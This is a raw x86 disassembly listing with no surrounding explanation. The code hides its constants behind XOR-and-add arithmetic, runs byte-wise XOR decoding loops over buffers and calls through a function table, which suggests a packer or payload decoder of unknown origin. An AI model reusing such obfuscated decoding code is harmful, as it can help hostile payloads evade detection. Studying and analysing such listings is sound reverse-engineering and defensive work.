  41b8a9:	lea    eax,[ebp-0x40]
  41b8ac:	push   eax
  41b8ad:	call   0x41e42c
  41b8b2:	mov    DWORD PTR [ebp-0x28],eax
  41b8b5:	jmp    0x41b8c3
  41b8b7:	mov    eax,DWORD PTR [ebp-0x28]
  41b8ba:	mov    ecx,DWORD PTR [ebp-0x18]
  41b8bd:	xor    ecx,ebx
  41b8bf:	add    ecx,esi
  41b8c1:	xor    DWORD PTR [eax],ecx
  41b8c3:	mov    eax,DWORD PTR [ebp-0x14]
  41b8c6:	mov    ecx,DWORD PTR [ebp-0x28]
  41b8c9:	xor    eax,ebx
  41b8cb:	add    eax,esi
  41b8cd:	cmp    eax,ecx
  41b8cf:	je     0x41c047
  41b8d5:	mov    eax,DWORD PTR [ebp-0x14]
  41b8d8:	mov    ecx,DWORD PTR [ebp-0x40]
  41b8db:	xor    eax,ebx
  41b8dd:	add    eax,esi
  41b8df:	cmp    eax,ecx
  41b8e1:	je     0x41c047
  41b8e7:	mov    eax,DWORD PTR [ebp-0x14]
  41b8ea:	xor    eax,ebx
  41b8ec:	add    eax,esi
  41b8ee:	jmp    0x41b90c
  41b8f0:	mov    edi,DWORD PTR [ebp-0x28]
  41b8f3:	mov    cl,al
  41b8f5:	and    cl,0x1f
  41b8f8:	or     dl,0xff
  41b8fb:	sub    dl,cl
  41b8fd:	add    BYTE PTR [edi+eax*1],dl
  41b900:	mov    ecx,DWORD PTR [ebp-0x18]
  41b903:	xor    ecx,ebx
  41b905:	lea    eax,[eax+ecx*1+0x3272e0]
  41b90c:	mov    ecx,DWORD PTR [ebp-0x40]
  41b90f:	cmp    eax,ecx
  41b911:	jb     0x41b8f0
  41b913:	mov    eax,DWORD PTR [ebp-0x40]
  41b916:	mov    DWORD PTR [ebp-0x24],eax
  41b919:	mov    eax,DWORD PTR [ebp-0x28]
  41b91c:	mov    DWORD PTR [ebp-0x38],0xf89c85b9
  41b923:	mov    DWORD PTR [ebp-0xbc],eax
  41b929:	mov    edi,0xf89c85b8
  41b92e:	mov    DWORD PTR [ebp-0x30],edi
  41b931:	mov    eax,DWORD PTR [ebp-0x38]
  41b934:	xor    eax,ebx
  41b936:	add    eax,esi
  41b938:	mov    DWORD PTR [ebp-0xc],eax
  41b93b:	mov    eax,DWORD PTR [ebp-0x38]
  41b93e:	xor    eax,ebx
  41b940:	add    eax,esi
  41b942:	mov    DWORD PTR [ebp-0x8],eax
  41b945:	mov    DWORD PTR [ebp-0x48],0xf89c85d9
  41b94c:	mov    DWORD PTR [ebp-0x54],0xf89c85be
  41b953:	mov    eax,DWORD PTR [ebp-0x38]
  41b956:	mov    ecx,DWORD PTR [ebp-0x24]
  41b959:	xor    eax,ebx
  41b95b:	add    eax,esi
  41b95d:	cmp    ecx,eax
  41b95f:	je     0x41bb5e
  41b965:	jmp    0x41bb3a
  41b96a:	mov    ecx,DWORD PTR [ebp-0xc]
  41b96d:	mov    eax,DWORD PTR [ebp-0x24]
  41b970:	sub    eax,ecx
  41b972:	mov    ecx,DWORD PTR [ebp-0x48]
  41b975:	xor    ecx,ebx
  41b977:	add    ecx,esi
  41b979:	xor    edx,edx
  41b97b:	div    ecx
  41b97d:	mov    DWORD PTR [ebp-0x8],eax
  41b980:	mov    eax,DWORD PTR [ebp-0x54]
  41b983:	mov    ecx,DWORD PTR [ebp-0x8]
  41b986:	xor    eax,ebx
  41b988:	add    eax,esi
  41b98a:	cmp    ecx,eax
  41b98c:	jbe    0x41b998
  41b98e:	mov    eax,DWORD PTR [ebp-0x54]
  41b991:	xor    eax,ebx
  41b993:	add    eax,esi
  41b995:	mov    DWORD PTR [ebp-0x8],eax
  41b998:	mov    eax,DWORD PTR [ebp-0x48]
  41b99b:	mov    ecx,DWORD PTR [ebp-0x8]
  41b99e:	xor    eax,ebx
  41b9a0:	add    eax,esi
  41b9a2:	imul   eax,ecx
  41b9a5:	mov    DWORD PTR [ebp-0x8],eax
  41b9a8:	mov    eax,DWORD PTR [ebp-0x38]
  41b9ab:	mov    ecx,DWORD PTR [ebp-0x8]
  41b9ae:	xor    eax,ebx
  41b9b0:	add    eax,esi
  41b9b2:	cmp    ecx,eax
  41b9b4:	je     0x41bb28
  41b9ba:	mov    eax,DWORD PTR [ebp-0x8]
  41b9bd:	mov    DWORD PTR [ebp-0x10],eax
  41b9c0:	mov    eax,DWORD PTR [ebp-0xc]
  41b9c3:	add    eax,DWORD PTR [ebp-0xbc]
  41b9c9:	mov    DWORD PTR [ebp-0x20],0xf89c85b9
  41b9d0:	mov    DWORD PTR [ebp-0x34],edi
  41b9d3:	mov    DWORD PTR [ebp-0xa8],0xf89c85bb
  41b9dd:	mov    DWORD PTR [ebp-0x8],eax
  41b9e0:	mov    DWORD PTR [ebp-0x2c],0xf89c85ba
  41b9e7:	mov    DWORD PTR [ebp-0x1c],edi
  41b9ea:	mov    eax,DWORD PTR [ebp-0x20]
  41b9ed:	xor    eax,ebx
  41b9ef:	add    eax,esi
  41b9f1:	jmp    0x41bae7
  41b9f6:	mov    DWORD PTR [ebp-0xb0],0xf89c85b3
  41ba00:	mov    DWORD PTR [ebp-0xb8],0xf89c85ad
  41ba0a:	mov    eax,DWORD PTR [ebp-0x1c]
  41ba0d:	mov    ecx,DWORD PTR [ebp-0x44]
  41ba10:	xor    eax,ebx
  41ba12:	add    eax,esi
  41ba14:	imul   eax,ecx
  41ba17:	mov    ecx,DWORD PTR [ebp-0x8]
  41ba1a:	mov    al,BYTE PTR [eax+ecx*1]
  41ba1d:	mov    BYTE PTR [ebp-0x2],al
  41ba20:	mov    eax,DWORD PTR [ebp-0x1c]
  41ba23:	mov    ecx,DWORD PTR [ebp-0x44]
  41ba26:	xor    eax,ebx
  41ba28:	add    eax,esi
  41ba2a:	imul   eax,ecx
  41ba2d:	mov    ecx,DWORD PTR [ebp-0xa8]
  41ba33:	xor    ecx,ebx
  41ba35:	add    eax,ecx
  41ba37:	mov    ecx,DWORD PTR [ebp-0x8]
  41ba3a:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272e0]
  41ba42:	mov    ecx,DWORD PTR [ebp-0xb0]
  41ba48:	xor    ecx,ebx
  41ba4a:	lea    eax,[ecx+eax*1+0x3272e0]
  41ba51:	movzx  ecx,BYTE PTR [ebp-0x2]
  41ba55:	xor    ecx,eax
  41ba57:	mov    BYTE PTR [ebp-0x2],cl
  41ba5a:	mov    al,BYTE PTR [ebp-0x2]
  41ba5d:	mov    ecx,DWORD PTR [ebp-0x1c]
  41ba60:	mov    edx,DWORD PTR [ebp-0x44]
  41ba63:	xor    ecx,ebx
  41ba65:	add    ecx,esi
  41ba67:	imul   ecx,edx
  41ba6a:	mov    edx,DWORD PTR [ebp-0x8]
  41ba6d:	mov    BYTE PTR [ecx+edx*1],al
  41ba70:	mov    eax,DWORD PTR [ebp-0x1c]
  41ba73:	mov    ecx,DWORD PTR [ebp-0x44]
  41ba76:	xor    eax,ebx
  41ba78:	add    eax,esi
  41ba7a:	imul   eax,ecx
  41ba7d:	mov    ecx,DWORD PTR [ebp-0x8]
  41ba80:	mov    al,BYTE PTR [eax+ecx*1]
  41ba83:	mov    BYTE PTR [ebp-0x2],al
  41ba86:	mov    eax,DWORD PTR [ebp-0x1c]
  41ba89:	mov    ecx,DWORD PTR [ebp-0x44]
  41ba8c:	xor    eax,ebx
  41ba8e:	add    eax,esi
  41ba90:	imul   eax,ecx
  41ba93:	mov    ecx,DWORD PTR [ebp-0x34]
  41ba96:	xor    ecx,ebx
  41ba98:	add    eax,ecx
  41ba9a:	mov    ecx,DWORD PTR [ebp-0x8]
  41ba9d:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272e0]
  41baa5:	mov    ecx,DWORD PTR [ebp-0xb8]
  41baab:	xor    ecx,ebx
  41baad:	lea    eax,[ecx+eax*1+0x3272e0]
  41bab4:	movzx  ecx,BYTE PTR [ebp-0x2]
  41bab8:	xor    ecx,eax
  41baba:	mov    BYTE PTR [ebp-0x2],cl
  41babd:	mov    al,BYTE PTR [ebp-0x2]
  41bac0:	mov    ecx,DWORD PTR [ebp-0x1c]
  41bac3:	mov    edx,DWORD PTR [ebp-0x44]
  41bac6:	xor    ecx,ebx
  41bac8:	add    ecx,esi
  41baca:	imul   ecx,edx
  41bacd:	mov    edx,DWORD PTR [ebp-0x8]
  41bad0:	mov    BYTE PTR [ecx+edx*1],al
  41bad3:	mov    eax,DWORD PTR [ebp-0x2c]
  41bad6:	mov    ecx,DWORD PTR [ebp-0x34]
  41bad9:	xor    eax,ebx
  41badb:	xor    ecx,ebx
  41badd:	add    eax,esi
  41badf:	add    ecx,esi
  41bae1:	imul   eax,ecx
  41bae4:	add    eax,DWORD PTR [ebp-0x44]
  41bae7:	mov    DWORD PTR [ebp-0x44],eax
  41baea:	mov    eax,DWORD PTR [ebp-0x44]
  41baed:	mov    ecx,DWORD PTR [ebp-0x10]
  41baf0:	cmp    ecx,eax
  41baf2:	jb     0x41b9f6
  41baf8:	mov    eax,DWORD PTR [ebp-0x34]
  41bafb:	mov    ecx,DWORD PTR [ebp-0x10]
  41bafe:	xor    eax,ebx
  41bb00:	add    eax,esi
  41bb02:	imul   eax,ecx
  41bb05:	mov    ecx,DWORD PTR [ebp-0x20]
  41bb08:	xor    ecx,ebx
  41bb0a:	add    ecx,esi
  41bb0c:	or     eax,ecx
  41bb0e:	mov    ecx,DWORD PTR [ebp-0x30]
  41bb11:	xor    ecx,ebx
  41bb13:	add    eax,ecx
  41bb15:	mov    ecx,DWORD PTR [ebp-0x30]
  41bb18:	xor    ecx,ebx
  41bb1a:	add    eax,ecx
  41bb1c:	mov    ecx,DWORD PTR [ebp-0xc]
  41bb1f:	lea    eax,[eax+ecx*1+0x64e5c0]
  41bb26:	jmp    0x41bb37
  41bb28:	mov    eax,DWORD PTR [ebp-0x30]
  41bb2b:	mov    ecx,DWORD PTR [ebp-0xc]
  41bb2e:	xor    eax,ebx
  41bb30:	lea    eax,[eax+ecx*1+0x3272e0]
  41bb37:	mov    DWORD PTR [ebp-0xc],eax
  41bb3a:	mov    eax,DWORD PTR [ebp-0x30]
  41bb3d:	xor    eax,ebx
  41bb3f:	mov    ecx,0xffcd8d20
  41bb44:	sub    ecx,eax
  41bb46:	add    ecx,DWORD PTR [ebp-0x24]
  41bb49:	mov    eax,DWORD PTR [ebp-0x30]
  41bb4c:	mov    edx,DWORD PTR [ebp-0xc]
  41bb4f:	xor    eax,ebx
  41bb51:	add    eax,esi
  41bb53:	imul   eax,edx
  41bb56:	cmp    eax,ecx
  41bb58:	jbe    0x41b96a
  41bb5e:	mov    eax,DWORD PTR [ebp-0x14]
  41bb61:	mov    ecx,DWORD PTR [ebp-0x40]
  41bb64:	mov    eax,DWORD PTR [ebp+0x8]
  41bb67:	mov    edx,DWORD PTR [ebp-0x4c]
  41bb6a:	mov    eax,DWORD PTR [eax+0x1d8]
  41bb70:	xor    edx,ebx
  41bb72:	add    edx,esi
  41bb74:	push   edx
  41bb75:	mov    edx,DWORD PTR [ebp-0x3c]
  41bb78:	xor    edx,ebx
  41bb7a:	add    edx,esi
  41bb7c:	push   edx
  41bb7d:	push   ecx
  41bb7e:	mov    DWORD PTR [ebp-0x2c],ecx
  41bb81:	mov    ecx,DWORD PTR [ebp-0x14]
  41bb84:	xor    ecx,ebx
  41bb86:	add    ecx,esi
  41bb88:	push   ecx
  41bb89:	call   DWORD PTR [eax+0x14]
  41bb8c:	mov    edi,eax
  41bb8e:	mov    eax,DWORD PTR [ebp-0x14]
  41bb91:	xor    eax,ebx
  41bb93:	add    eax,esi
  41bb95:	cmp    eax,edi
  41bb97:	je     0x41bbf2
  41bb99:	mov    eax,DWORD PTR [ebp-0x14]
  41bb9c:	jmp    0x41bbbf
  41bb9e:	mov    ecx,DWORD PTR [ebp-0x28]
  41bba1:	xor    eax,ebx
  41bba3:	mov    cl,BYTE PTR [ecx+eax*1+0x3272e0]
  41bbaa:	mov    BYTE PTR [eax+edi*1+0x3272e0],cl
  41bbb1:	mov    ecx,DWORD PTR [ebp-0x18]
  41bbb4:	xor    ecx,ebx
  41bbb6:	lea    eax,[ecx+eax*1+0x3272e0]
  41bbbd:	xor    eax,ebx
  41bbbf:	mov    ecx,DWORD PTR [ebp-0x40]
  41bbc2:	sub    ecx,esi
  41bbc4:	xor    ecx,ebx
  41bbc6:	cmp    eax,ecx
  41bbc8:	jne    0x41bb9e
  41bbca:	mov    eax,DWORD PTR [ebp+0x8]
  41bbcd:	mov    ecx,DWORD PTR [ebp-0x50]
  41bbd0:	mov    eax,DWORD PTR [eax+0x1d8]
  41bbd6:	xor    ecx,ebx
  41bbd8:	add    ecx,esi
  41bbda:	push   ecx
  41bbdb:	mov    ecx,DWORD PTR [ebp-0x14]
  41bbde:	xor    ecx,ebx
  41bbe0:	add    ecx,esi
  41bbe2:	push   ecx
  41bbe3:	push   DWORD PTR [ebp-0x28]
  41bbe6:	call   DWORD PTR [eax+0x18]
  41bbe9:	mov    eax,DWORD PTR [ebp-0x2c]
  41bbec:	mov    DWORD PTR [ebp-0x28],edi
  41bbef:	mov    DWORD PTR [ebp-0x40],eax
  41bbf2:	mov    edi,DWORD PTR [ebp-0x28]
  41bbf5:	mov    eax,DWORD PTR [ebp-0x18]
  41bbf8:	mov    ecx,DWORD PTR [ebp-0x14]
  41bbfb:	xor    eax,ebx
  41bbfd:	mov    DWORD PTR [ebp-0x2c],edi
  41bc00:	add    eax,esi
  41bc02:	mov    DWORD PTR [ebp-0x5c],0x39122a12
  41bc09:	mov    DWORD PTR [ebp-0x58],0x27123f12
  41bc10:	jmp    0x41bc44
  41bc12:	xor    ecx,ebx
  41bc14:	mov    dl,BYTE PTR [ebp+ecx*1+0x327284]
  41bc1b:	xor    dl,0x73
  41bc1e:	sub    dl,0x9
  41bc21:	mov    DWORD PTR [ebp-0x3c],ecx
  41bc24:	movsx  ecx,BYTE PTR [ecx+edi*1+0x3272e0]
  41bc2c:	movzx  edx,dl
  41bc2f:	cmp    ecx,edx
  41bc31:	jne    0x41bc4e
  41bc33:	mov    ecx,DWORD PTR [ebp-0x18]
  41bc36:	mov    edx,DWORD PTR [ebp-0x3c]
  41bc39:	xor    ecx,ebx
  41bc3b:	lea    ecx,[ecx+edx*1+0x3272e0]
  41bc42:	xor    ecx,ebx
  41bc44:	cmp    ecx,0xf89c85b1
  41bc4a:	jne    0x41bc12
  41bc4c:	jmp    0x41bc55
  41bc4e:	mov    eax,DWORD PTR [ebp-0x14]
  41bc51:	xor    eax,ebx
  41bc53:	add    eax,esi
  41bc55:	mov    ecx,DWORD PTR [ebp-0x14]
  41bc58:	xor    ecx,ebx
  41bc5a:	add    ecx,esi
  41bc5c:	cmp    ecx,eax
  41bc5e:	je     0x41bdd1
  41bc64:	mov    eax,DWORD PTR [edi+0x8]
  41bc67:	mov    DWORD PTR [ebp-0xc],0xf89c85b9
  41bc6e:	mov    DWORD PTR [ebp-0x3c],0xf89cc316
  41bc75:	mov    DWORD PTR [ebp-0x48],0xf89cb5b9
  41bc7c:	mov    DWORD PTR [ebp-0x20],0xf89c85bd
  41bc83:	mov    DWORD PTR [ebp-0x10],eax
  41bc86:	mov    eax,DWORD PTR [ebp+0x8]
  41bc89:	mov    ecx,DWORD PTR [ebp-0x20]
  41bc8c:	xor    ecx,ebx
  41bc8e:	add    ecx,esi
  41bc90:	push   ecx
  41bc91:	mov    ecx,DWORD PTR [ebp-0x48]
  41bc94:	mov    eax,DWORD PTR [eax+0x1d8]
  41bc9a:	xor    ecx,ebx
  41bc9c:	add    ecx,esi
  41bc9e:	push   ecx
  41bc9f:	mov    ecx,DWORD PTR [ebp-0x3c]
  41bca2:	xor    ecx,ebx
  41bca4:	add    ecx,esi
  41bca6:	push   ecx
  41bca7:	mov    ecx,DWORD PTR [ebp-0xc]
  41bcaa:	xor    ecx,ebx
  41bcac:	add    ecx,esi
  41bcae:	push   ecx
  41bcaf:	call   DWORD PTR [eax+0x14]
  41bcb2:	mov    edi,eax
  41bcb4:	mov    eax,DWORD PTR [ebp+0x8]
  41bcb7:	mov    ecx,DWORD PTR [ebp-0x20]
  41bcba:	mov    eax,DWORD PTR [eax+0x1d8]
  41bcc0:	xor    ecx,ebx
  41bcc2:	add    ecx,esi
  41bcc4:	push   ecx
  41bcc5:	mov    ecx,DWORD PTR [ebp-0x48]
  41bcc8:	xor    ecx,ebx
  41bcca:	add    ecx,esi
  41bccc:	push   ecx
  41bccd:	mov    ecx,DWORD PTR [ebp-0xc]
  41bcd0:	push   DWORD PTR [ebp-0x10]
  41bcd3:	xor    ecx,ebx
  41bcd5:	add    ecx,esi
  41bcd7:	push   ecx
  41bcd8:	call   DWORD PTR [eax+0x14]
  41bcdb:	mov    ecx,DWORD PTR [ebp-0xc]
  41bcde:	xor    ecx,ebx
  41bce0:	add    ecx,esi
  41bce2:	mov    DWORD PTR [ebp-0x20],eax
  41bce5:	cmp    ecx,edi
  41bce7:	je     0x41c074
  41bced:	mov    ecx,DWORD PTR [ebp-0xc]
  41bcf0:	xor    ecx,ebx
  41bcf2:	add    ecx,esi
  41bcf4:	cmp    ecx,eax
  41bcf6:	je     0x41c074
  41bcfc:	mov    DWORD PTR [ebp-0x3c],0xf89c85ba
  41bd03:	mov    DWORD PTR [ebp-0x4c],0xf89c85bb
  41bd0a:	mov    ecx,DWORD PTR [ebp-0x3c]
  41bd0d:	xor    cl,0x99
  41bd10:	sub    cl,0x20
  41bd13:	mov    BYTE PTR [edi],cl
  41bd15:	mov    ecx,DWORD PTR [ebp-0xc]
  41bd18:	xor    cl,0x99
  41bd1b:	sub    cl,0x20
  41bd1e:	mov    BYTE PTR [edi+0x1],cl
  41bd21:	mov    ecx,DWORD PTR [ebp-0x4c]
  41bd24:	xor    cl,0x99
  41bd27:	sub    cl,0x20
  41bd2a:	mov    BYTE PTR [edi+0x2],cl
  41bd2d:	and    DWORD PTR [ebp-0xb4],0x0
  41bd34:	and    DWORD PTR [ebp-0xa4],0x0
  41bd3b:	lea    ecx,[ebp-0xa4]
  41bd41:	push   ecx
  41bd42:	push   DWORD PTR [ebp-0x10]
  41bd45:	push   eax
  41bd46:	lea    eax,[ebp-0xb4]
  41bd4c:	push   eax
  41bd4d:	mov    eax,DWORD PTR [ebp-0x2c]
  41bd50:	push   DWORD PTR [eax+0xc]
  41bd53:	mov    eax,DWORD PTR [ebp-0x28]
  41bd56:	add    eax,0x10
  41bd59:	push   eax
  41bd5a:	push   edi
  41bd5b:	call   0x41b0a7
  41bd60:	mov    DWORD PTR [ebp-0x3c],eax
  41bd63:	mov    eax,DWORD PTR [ebp+0x8]
  41bd66:	mov    ecx,DWORD PTR [ebp-0x50]
  41bd69:	mov    eax,DWORD PTR [eax+0x1d8]
  41bd6f:	xor    ecx,ebx
  41bd71:	add    ecx,esi
  41bd73:	push   ecx
  41bd74:	mov    ecx,DWORD PTR [ebp-0xc]
  41bd77:	xor    ecx,ebx
  41bd79:	add    ecx,esi
  41bd7b:	push   ecx
  41bd7c:	push   edi
  41bd7d:	call   DWORD PTR [eax+0x18]
  41bd80:	mov    eax,DWORD PTR [ebp-0x3c]
  41bd83:	add    eax,0xffcd8d20
  41bd88:	xor    eax,ebx
  41bd8a:	cmp    eax,0xf89c85b9
  41bd8f:	mov    eax,DWORD PTR [ebp+0x8]
  41bd92:	mov    eax,DWORD PTR [eax+0x1d8]
  41bd98:	mov    ecx,DWORD PTR [ebp-0x50]
  41bd9b:	jne    0x41bdbe
  41bd9d:	xor    ecx,ebx
  41bd9f:	add    ecx,esi
  41bda1:	push   ecx
  41bda2:	mov    ecx,DWORD PTR [ebp-0xc]
  41bda5:	xor    ecx,ebx
  41bda7:	add    ecx,esi
  41bda9:	push   ecx
  41bdaa:	push   DWORD PTR [ebp-0x28]
  41bdad:	call   DWORD PTR [eax+0x18]
  41bdb0:	mov    eax,DWORD PTR [ebp-0x20]
  41bdb3:	mov    DWORD PTR [ebp-0x28],eax
  41bdb6:	mov    eax,DWORD PTR [ebp-0x10]
  41bdb9:	mov    DWORD PTR [ebp-0x40],eax
  41bdbc:	jmp    0x41bdd1
  41bdbe:	xor    ecx,ebx
  41bdc0:	add    ecx,esi
  41bdc2:	push   ecx
  41bdc3:	mov    ecx,DWORD PTR [ebp-0xc]
  41bdc6:	xor    ecx,ebx
  41bdc8:	add    ecx,esi
  41bdca:	push   ecx
  41bdcb:	push   DWORD PTR [ebp-0x20]
  41bdce:	call   DWORD PTR [eax+0x18]
  41bdd1:	mov    eax,DWORD PTR [ebp-0x40]
  41bdd4:	mov    DWORD PTR [ebp-0x38],eax
  41bdd7:	mov    eax,DWORD PTR [ebp-0x28]
  41bdda:	mov    DWORD PTR [ebp-0x24],0xf89c85b9
  41bde1:	mov    DWORD PTR [ebp-0x3c],eax
  41bde4:	mov    edi,0xf89c85b8
  41bde9:	mov    DWORD PTR [ebp-0x30],edi
  41bdec:	mov    eax,DWORD PTR [ebp-0x24]
  41bdef:	xor    eax,ebx
  41bdf1:	add    eax,esi
  41bdf3:	mov    DWORD PTR [ebp-0xc],eax
  41bdf6:	mov    eax,DWORD PTR [ebp-0x24]
  41bdf9:	xor    eax,ebx
  41bdfb:	add    eax,esi
  41bdfd:	mov    DWORD PTR [ebp-0x10],eax
  41be00:	mov    DWORD PTR [ebp-0x48],0xf89c85d9
  41be07:	mov    DWORD PTR [ebp-0x20],0xf89c85be
  41be0e:	mov    eax,DWORD PTR [ebp-0x24]
  41be11:	mov    ecx,DWORD PTR [ebp-0x38]
  41be14:	xor    eax,ebx
  41be16:	add    eax,esi
  41be18:	cmp    ecx,eax
  41be1a:	je     0x41c010
  41be20:	jmp    0x41bfec
  41be25:	mov    ecx,DWORD PTR [ebp-0xc]
  41be28:	mov    eax,DWORD PTR [ebp-0x38]
  41be2b:	sub    eax,ecx
  41be2d:	mov    ecx,DWORD PTR [ebp-0x48]
  41be30:	xor    ecx,ebx
  41be32:	add    ecx,esi
  41be34:	xor    edx,edx
  41be36:	div    ecx
  41be38:	mov    DWORD PTR [ebp-0x10],eax
  41be3b:	mov    eax,DWORD PTR [ebp-0x20]
  41be3e:	mov    ecx,DWORD PTR [ebp-0x10]
  41be41:	xor    eax,ebx
  41be43:	add    eax,esi
  41be45:	cmp    ecx,eax
  41be47:	jbe    0x41be53
  41be49:	mov    eax,DWORD PTR [ebp-0x20]
  41be4c:	xor    eax,ebx
  41be4e:	add    eax,esi
  41be50:	mov    DWORD PTR [ebp-0x10],eax
  41be53:	mov    eax,DWORD PTR [ebp-0x48]
  41be56:	mov    ecx,DWORD PTR [ebp-0x10]
  41be59:	xor    eax,ebx
  41be5b:	add    eax,esi
  41be5d:	imul   eax,ecx
  41be60:	mov    DWORD PTR [ebp-0x10],eax
  41be63:	mov    eax,DWORD PTR [ebp-0x24]
  41be66:	mov    ecx,DWORD PTR [ebp-0x10]
  41be69:	xor    eax,ebx
  41be6b:	add    eax,esi
  41be6d:	cmp    ecx,eax
  41be6f:	je     0x41bfda
  41be75:	mov    eax,DWORD PTR [ebp-0x10]
  41be78:	mov    DWORD PTR [ebp-0x34],eax
  41be7b:	mov    eax,DWORD PTR [ebp-0xc]
  41be7e:	add    eax,DWORD PTR [ebp-0x3c]
  41be81:	mov    DWORD PTR [ebp-0x54],0xf89c85b9
  41be88:	mov    DWORD PTR [ebp-0x10],edi
  41be8b:	mov    DWORD PTR [ebp-0x4c],0xf89c85bb
  41be92:	mov    DWORD PTR [ebp-0x1c],eax
  41be95:	mov    DWORD PTR [ebp-0x2c],0xf89c85ba
  41be9c:	mov    DWORD PTR [ebp-0x8],edi
  41be9f:	mov    eax,DWORD PTR [ebp-0x54]
  41bea2:	xor    eax,ebx
  41bea4:	add    eax,esi
  41bea6:	jmp    0x41bf99
  41beab:	mov    DWORD PTR [ebp-0xac],0xf89c85b3
  41beb5:	mov    DWORD PTR [ebp-0x9c],0xf89c85ad
  41bebf:	mov    eax,DWORD PTR [ebp-0x8]
  41bec2:	mov    ecx,DWORD PTR [ebp-0x18]
  41bec5:	xor    eax,ebx
  41bec7:	add    eax,esi
  41bec9:	imul   eax,ecx
  41becc:	mov    ecx,DWORD PTR [ebp-0x1c]
  41becf:	mov    al,BYTE PTR [eax+ecx*1]
  41bed2:	mov    BYTE PTR [ebp-0x1],al
  41bed5:	mov    eax,DWORD PTR [ebp-0x8]
  41bed8:	mov    ecx,DWORD PTR [ebp-0x18]
  41bedb:	xor    eax,ebx
  41bedd:	add    eax,esi
  41bedf:	imul   eax,ecx
  41bee2:	mov    ecx,DWORD PTR [ebp-0x4c]
  41bee5:	xor    ecx,ebx
  41bee7:	add    eax,ecx
  41bee9:	mov    ecx,DWORD PTR [ebp-0x1c]
  41beec:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272e0]
  41bef4:	mov    ecx,DWORD PTR [ebp-0xac]
  41befa:	xor    ecx,ebx
  41befc:	lea    eax,[ecx+eax*1+0x3272e0]
  41bf03:	movzx  ecx,BYTE PTR [ebp-0x1]
  41bf07:	xor    ecx,eax
  41bf09:	mov    BYTE PTR [ebp-0x1],cl
  41bf0c:	mov    al,BYTE PTR [ebp-0x1]
  41bf0f:	mov    ecx,DWORD PTR [ebp-0x8]
  41bf12:	mov    edx,DWORD PTR [ebp-0x18]
  41bf15:	xor    ecx,ebx
  41bf17:	add    ecx,esi
  41bf19:	imul   ecx,edx
  41bf1c:	mov    edx,DWORD PTR [ebp-0x1c]
  41bf1f:	mov    BYTE PTR [ecx+edx*1],al
  41bf22:	mov    eax,DWORD PTR [ebp-0x8]
  41bf25:	mov    ecx,DWORD PTR [ebp-0x18]
  41bf28:	xor    eax,ebx
  41bf2a:	add    eax,esi
  41bf2c:	imul   eax,ecx
  41bf2f:	mov    ecx,DWORD PTR [ebp-0x1c]
  41bf32:	mov    al,BYTE PTR [eax+ecx*1]
  41bf35:	mov    BYTE PTR [ebp-0x1],al
  41bf38:	mov    eax,DWORD PTR [ebp-0x8]
  41bf3b:	mov    ecx,DWORD PTR [ebp-0x18]
  41bf3e:	xor    eax,ebx
  41bf40:	add    eax,esi
  41bf42:	imul   eax,ecx
  41bf45:	mov    ecx,DWORD PTR [ebp-0x10]
  41bf48:	xor    ecx,ebx
  41bf4a:	add    eax,ecx
  41bf4c:	mov    ecx,DWORD PTR [ebp-0x1c]
  41bf4f:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272e0]
  41bf57:	mov    ecx,DWORD PTR [ebp-0x9c]
  41bf5d:	xor    ecx,ebx
  41bf5f:	lea    eax,[ecx+eax*1+0x3272e0]
  41bf66:	movzx  ecx,BYTE PTR [ebp-0x1]
  41bf6a:	xor    ecx,eax
  41bf6c:	mov    BYTE PTR [ebp-0x1],cl
  41bf6f:	mov    al,BYTE PTR [ebp-0x1]
  41bf72:	mov    ecx,DWORD PTR [ebp-0x8]
  41bf75:	mov    edx,DWORD PTR [ebp-0x18]
  41bf78:	xor    ecx,ebx
  41bf7a:	add    ecx,esi
  41bf7c:	imul   ecx,edx
  41bf7f:	mov    edx,DWORD PTR [ebp-0x1c]
  41bf82:	mov    BYTE PTR [ecx+edx*1],al
  41bf85:	mov    eax,DWORD PTR [ebp-0x2c]
  41bf88:	mov    ecx,DWORD PTR [ebp-0x10]
  41bf8b:	xor    eax,ebx
  41bf8d:	xor    ecx,ebx
  41bf8f:	add    eax,esi
  41bf91:	add    ecx,esi
  41bf93:	imul   eax,ecx
  41bf96:	add    eax,DWORD PTR [ebp-0x18]
  41bf99:	mov    DWORD PTR [ebp-0x18],eax
  41bf9c:	mov    eax,DWORD PTR [ebp-0x18]
  41bf9f:	mov    ecx,DWORD PTR [ebp-0x34]
  41bfa2:	cmp    ecx,eax
  41bfa4:	jb     0x41beab
  41bfaa:	mov    eax,DWORD PTR [ebp-0x10]
  41bfad:	mov    ecx,DWORD PTR [ebp-0x34]
  41bfb0:	xor    eax,ebx
  41bfb2:	add    eax,esi
  41bfb4:	imul   eax,ecx
  41bfb7:	mov    ecx,DWORD PTR [ebp-0x54]
  41bfba:	xor    ecx,ebx
  41bfbc:	add    ecx,esi
  41bfbe:	or     eax,ecx
  41bfc0:	mov    ecx,DWORD PTR [ebp-0x30]
  41bfc3:	xor    ecx,ebx
  41bfc5:	add    eax,ecx
  41bfc7:	mov    ecx,DWORD PTR [ebp-0x30]
  41bfca:	xor    ecx,ebx
  41bfcc:	add    eax,ecx
  41bfce:	mov    ecx,DWORD PTR [ebp-0xc]
  41bfd1:	lea    eax,[eax+ecx*1+0x64e5c0]
  41bfd8:	jmp    0x41bfe9
  41bfda:	mov    eax,DWORD PTR [ebp-0x30]
  41bfdd:	mov    ecx,DWORD PTR [ebp-0xc]
  41bfe0:	xor    eax,ebx
  41bfe2:	lea    eax,[eax+ecx*1+0x3272e0]
  41bfe9:	mov    DWORD PTR [ebp-0xc],eax
  41bfec:	mov    eax,DWORD PTR [ebp-0x30]
  41bfef:	xor    eax,ebx
  41bff1:	mov    ecx,0xffcd8d20
  41bff6:	sub    ecx,eax
  41bff8:	add    ecx,DWORD PTR [ebp-0x38]
  41bffb:	mov    eax,DWORD PTR [ebp-0x30]
  41bffe:	mov    edx,DWORD PTR [ebp-0xc]
  41c001:	xor    eax,ebx
  41c003:	add    eax,esi
  41c005:	imul   eax,edx
  41c008:	cmp    eax,ecx
  41c00a:	jbe    0x41be25
  41c010:	push   DWORD PTR [ebp+0x8]
  41c013:	mov    eax,DWORD PTR [ebp+0x8]
  41c016:	push   DWORD PTR [eax+0x1cc]
  41c01c:	lea    eax,[ebp-0xa0]
  41c022:	push   eax
  41c023:	mov    eax,DWORD PTR [ebp+0x8]
  41c026:	mov    eax,DWORD PTR [eax+0x1c4]
  41c02c:	push   DWORD PTR [eax]
